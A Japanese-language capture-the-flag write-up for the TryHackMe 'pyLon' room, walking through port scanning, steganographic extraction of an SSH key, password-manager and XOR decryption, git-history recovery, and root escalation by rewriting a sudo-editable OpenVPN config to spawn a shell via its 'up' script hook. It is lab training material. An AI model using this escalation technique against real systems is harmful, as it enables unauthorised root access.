# pyLon CTF

https://tryhackme.com/room/pylonzf

## Enumeration

```shell
TARGET=10.48.160.0
sudo bash -c "echo $TARGET   pylon >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 64
222/tcp open  rsh-spx syn-ack ttl 63
```

```sh
sudo nmap -sV -p22,222 $TARGET

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
222/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
```

SSHが２つ。

## 添付ファイル

exiftool を実行すると、Hex, Base85 のチェーンが示唆されている。

```
Subject                         : https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)To_Base85('!-u',false)
```

### stegseek

添付ファイルから隠しファイルを抽出

```sh
$ stegseek ./pepper_1611998632625.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "pepper"

[i] Original filename: "lone".
[i] Extracting to "pepper_1611998632625.jpg.out".
```

```sh
$ cat ./pepper_1611998632625.jpg.out 
H4sIAAAAAAAAA+3Vya6zyBUA4H/NU9w9ilxMBha9KObZDMY2bCIGG2MmMw9P39c3idRZtJJNK4rE
J6FT0imkoupQp2zq+9/z9NdfCXyjafoTMZoCf4wfBEnQvzASAJKkAX7EfgEMo2jw6wv8pav6p7Ef
ou7r69e7aVKQ/fm8/5T/P/W3D06UVevrZIuW5ylftqte4Fn80sXgJ4vEBFfGtbVFPNaFt2JIXyL8
...
```

`H4sIAAA...` は、gzip をBase64エンコードしたときにあらわれる文字列。

```sh
$ awk '{ printf "%s", $0 }' ./pepper_1611998632625.jpg.out | base64 -d > pepper.gz

$ file ./pepper.gz                                                                
./pepper.gzip: gzip compressed data, from Unix, original size modulo 2^32 10240

$ gunzip ./pepper.gz

$ file pepper       
pepper: POSIX tar archive (GNU)

$ tar -xvf ./pepper                          
lone_id

$ cat ./lone_id                                  
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA45nVhEtT37sKnNBWH2VYsXbjA8vAK8e04HfrgF06NiGGQsRBLtJw
....
-----END OPENSSH PRIVATE KEY-----
```

SSH秘密鍵になった。

### 222

222ポートにSSH接続すると、暗号鍵を求められる。

```sh
               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

[*] Encryption key exists in database.

Enter your encryption key: 
```

`pepper` を ToHEX, ToBase85 した文字列を入力したら先に進めた。

```sh
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

  
        [1] Decrypt a password.
        [2] Create new password.
        [3] Delete a password.
        [4] Search passwords.
        

Select an option [Q] to Quit: 
```

[1] Decrypt a password.

```sh
         SITE                        USERNAME
 [1]     pylon.thm                   lone                        
 [2]     FLAG 1                      FLAG 1
```

フラグ1入手

```sh
    Password for FLAG 1

        Username = FLAG 1
        Password = THM{[REDACTED]}
```

```sh
    Password for pylon.thm

        Username = lone
        Password = [REDACTED]
```

22ポートに接続できた。

## 22

```sh
lone@pylon:~/pylon$ ls -al /home
total 20
drwxr-xr-x  5 root  root  4096 Jan 30  2021 .
drwxr-xr-x 24 root  root  4096 Mar 30  2021 ..
drwxr-x---  6 lone  lone  4096 Jan 30  2021 lone
drwxr-x---  5 pood  pood  4096 Jan 30  2021 pood
drwxr-x---  5 pylon pylon 4096 Mar 30  2021 pylon
```

gpg ファイルがあるがパスフレーズ不明。pylonの中にgitディレクトリがある。

```sh
lone@pylon:~$ ls -al
total 48
drwxr-x--- 6 lone lone 4096 Jan 30  2021 .
drwxr-xr-x 5 root root 4096 Jan 30  2021 ..
lrwxrwxrwx 1 lone lone    9 Jan 30  2021 .bash_history -> /dev/null
-rw-r--r-- 1 lone lone  220 Jan 30  2021 .bash_logout
-rw-r--r-- 1 lone lone 3771 Jan 30  2021 .bashrc
drwx------ 2 lone lone 4096 Jan 30  2021 .cache
-rw-rw-r-- 1 lone lone   44 Jan 30  2021 .gitconfig
drwx------ 4 lone lone 4096 Jan 30  2021 .gnupg
drwxrwxr-x 3 lone lone 4096 Jan 30  2021 .local
-rw-r--r-- 1 lone lone  807 Jan 30  2021 .profile
-rw-rw-r-- 1 pood pood  600 Jan 30  2021 note_from_pood.gpg
drwxr-xr-x 3 lone lone 4096 Jan 30  2021 pylon
-rw-r--r-- 1 lone lone   18 Jan 30  2021 user1.txt
```

openvpn を sudo で実行できるが、どう使えるか不明。

```sh
lone@pylon:~/pylon$ sudo -l
[sudo] password for lone: 
Matching Defaults entries for lone on pylon:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lone may run the following commands on pylon:
    (root) /usr/sbin/openvpn /opt/openvpn/client.ovpn
```

```sh
lone@pylon:~$ ls -al /opt/openvpn/client.ovpn
-rw-rw---- 1 root root 8187 Jan 26  2021 /opt/openvpn/client.ovpn
```

実行してみたが・・・？

```sh
lone@pylon:~/pylon$ sudo /usr/sbin/openvpn /opt/openvpn/client.ovpn
[sudo] password for lone: 
Sun Dec 14 02:26:30 2025 OpenVPN 2.4.4 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on May 14 2019
Sun Dec 14 02:26:30 2025 library versions: OpenSSL 1.1.1  11 Sep 2018, LZO 2.08
Sun Dec 14 02:26:30 2025 WARNING: Your certificate has expired!
Sun Dec 14 02:26:30 2025 TCP/UDP: Preserving recently used remote address: [AF_INET]127.0.0.1:1194
Sun Dec 14 02:26:30 2025 UDP link local: (not bound)
Sun Dec 14 02:26:30 2025 UDP link remote: [AF_INET]127.0.0.1:1194
Sun Dec 14 02:26:30 2025 VERIFY ERROR: depth=0, error=certificate has expired: CN=server
Sun Dec 14 02:26:30 2025 OpenSSL: error:1416F086:SSL routines:tls_process_server_certificate:certificate verify failed
Sun Dec 14 02:26:30 2025 TLS_ERROR: BIO read tls_read_plaintext error
Sun Dec 14 02:26:30 2025 TLS Error: TLS object -> incoming plaintext read error
Sun Dec 14 02:26:30 2025 TLS Error: TLS handshake failed
Sun Dec 14 02:26:30 2025 SIGUSR1[soft,tls-error] received, process restarting
Sun Dec 14 02:26:35 2025 TCP/UDP: Preserving recently used remote address: [AF_INET]127.0.0.1:1194
Sun Dec 14 02:26:35 2025 UDP link local: (not bound)
Sun Dec 14 02:26:35 2025 UDP link remote: [AF_INET]127.0.0.1:1194
Sun Dec 14 02:26:35 2025 VERIFY ERROR: depth=0, error=certificate has expired: CN=server
Sun Dec 14 02:26:35 2025 OpenSSL: error:1416F086:SSL routines:tls_process_server_certificate:certificate verify failed
```

git

```sh
That is all, please enjoy this app.lone@pylon:~/pylon$ ls -al
total 40
drwxr-xr-x 3 lone lone 4096 Jan 30  2021 .
drwxr-x--- 6 lone lone 4096 Jan 30  2021 ..
drwxrwxr-x 8 lone lone 4096 Dec 14 01:35 .git
-rw-rw-r-- 1 lone lone  793 Jan 30  2021 README.txt
-rw-rw-r-- 1 lone lone  340 Jan 30  2021 banner.b64
-rwxrwxr-x 1 lone lone 8413 Jan 30  2021 pyLon.py
-rw-rw-r-- 1 lone lone 2195 Jan 30  2021 pyLon_crypt.py
-rw-rw-r-- 1 lone lone 3973 Jan 30  2021 pyLon_db.py
```

過去のコミットにdbファイルが含まれていた。

```sh
lone@pylon:~/pylon$ git checkout cfc14d599b9b3cf24f909f66b5123ee0bbccc8da

lone@pylon:~/pylon$ ls
README.txt  banner.b64  pyLon.db  pyLon_crypt.py  pyLon_db.py  pyLon_pwMan.py
```

pylon.thm_gpg_key / lone_gpg_key が入っていた。これをそのまま使ってgpgで復号化しようとしたが、失敗。

```
40703[REDACTED]
```

pyLon_crypt.py をもとに、XORで復号する。

```python
from hashlib import md5
from binascii import hexlify, unhexlify
from random import shuffle, randint

def decrypt_password(cypher_text: str):
    """ decryption method for password """
    passphrase = b"[REDACTED]"
    passphrase_integer = int(md5(passphrase).hexdigest(), 16)
    encrypted_integer = int(cypher_text, 16)
    plain_text = str(unhexlify(hex(passphrase_integer ^ encrypted_integer)[2:]), "utf8")
    return plain_text

print(decrypt_password("40703[REDACTED]"))
```

gpg ファイルを復号。openvpnに関するメッセージ。poodのパスワード付き。

```sh
lone@pylon:~$ gpg --decrypt ./note_from_pood.gpg 
gpg: Note: secret key D83FA5A7160FFE57 expired at Fri Jan 27 19:13:48 2023 UTC
gpg: encrypted with 3072-bit RSA key, ID D83FA5A7160FFE57, created 2021-01-27
      "lon E <lone@pylon.thm>"
Hi Lone,

Can you please fix the openvpn config?

It's not behaving itself again.

oh, by the way, my password is [REDACTED]

Thanks again.
```

## 権限昇格２

```sh
pood@pylon:~$ ls -al
total 36
drwxr-x--- 5 pood pood 4096 Jan 30  2021 .
drwxr-xr-x 5 root root 4096 Jan 30  2021 ..
lrwxrwxrwx 1 pood pood    9 Jan 30  2021 .bash_history -> /dev/null
-rw-r--r-- 1 pood pood  220 Jan 30  2021 .bash_logout
-rw-r--r-- 1 pood pood 3771 Jan 30  2021 .bashrc
drwx------ 2 pood pood 4096 Jan 30  2021 .cache
drwx------ 4 pood pood 4096 Jan 30  2021 .gnupg
drwxr-xr-x 3 pood pood 4096 Jan 30  2021 .local
-rw-r--r-- 1 pood pood  807 Jan 30  2021 .profile
-rw-rw-r-- 1 pood pood   29 Jan 30  2021 user2.txt
```

/opt/openvpn/client.ovpn を sudoedit で編集する権限がある。

```sh
pood@pylon:~$ sudo -l
[sudo] password for pood: 
Matching Defaults entries for pood on pylon:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pood may run the following commands on pylon:
    (root) sudoedit /opt/openvpn/client.ovpn
```

openvpnの権限昇格には下記の方法があり、これをclient.ovpnの設定によって再現することは可能か？

```sh
sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
```

/opt/openvpn/client.ovpn を下記の3行だけにする。

```sh
dev null
script-security 2
up "/bin/sh -c sh"
```

昇格成功！

```sh
lone@pylon:~$ sudo /usr/sbin/openvpn /opt/openvpn/client.ovpn
Mon Dec 15 01:56:19 2025 disabling NCP mode (--ncp-disable) because not in P2MP client or server mode
Mon Dec 15 01:56:19 2025 OpenVPN 2.4.4 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on May 14 2019
Mon Dec 15 01:56:19 2025 library versions: OpenSSL 1.1.1  11 Sep 2018, LZO 2.08
Mon Dec 15 01:56:19 2025 NOTE: the current --script-security setting may allow this configuration to call user-defined scripts
Mon Dec 15 01:56:19 2025 ******* WARNING *******: All encryption and authentication features disabled -- All data will be tunnelled as clear text and will not be protected against man-in-the-middle changes. PLEASE DO RECONSIDER THIS CONFIGURATION!
Mon Dec 15 01:56:19 2025 /bin/sh -c sh null 1500 1500   init
# id
uid=0(root) gid=0(root) groups=0(root)
```

フラグがgpgファイルになっていたが、パスフレーズなしで復号できた。

```sh
# gpg --decrypt ./root.txt.gpg
gpg: Note: secret key 91B77766BE20A385 expired at Fri Jan 27 19:04:03 2023 UTC
gpg: encrypted with 3072-bit RSA key, ID 91B77766BE20A385, created 2021-01-27
      "I am g ROOT <root@pylon.thm>"
ThM{[REDACTED]}
```

## 振り返り

- 多くのパスフレーズとパスワードが飛び交うため混乱した。整理できれば納得。
- `H4sIAAA...` が、gzip をBase64エンコードしたときにあらわれる文字列であることは覚えておきたい。
- openvpn の設定ファイルを使うテクニックは覚えておきたい。

## Tags

#tags:ステガノグラフィー #tags:openvpn
